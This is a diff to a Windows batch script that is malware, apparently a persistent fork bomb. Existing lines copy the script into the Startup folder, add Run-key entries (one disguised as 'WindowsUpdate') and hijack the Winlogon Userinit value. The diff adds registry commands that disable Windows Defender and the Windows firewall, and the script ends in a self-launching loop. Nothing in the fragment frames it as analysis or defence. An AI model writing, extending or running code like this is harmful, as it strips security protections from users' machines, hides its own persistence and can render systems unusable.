@@ -4,6 +4,8 @@ copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ForkBomb_%random%" /t REG_SZ /d "%~f0" /f 2>nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
 
 :loop
 
@@ -50,6 +52,3 @@ set "p= /c"
 %c%%p% %s% "" "%f%"
 
 goto loop
-
-
-
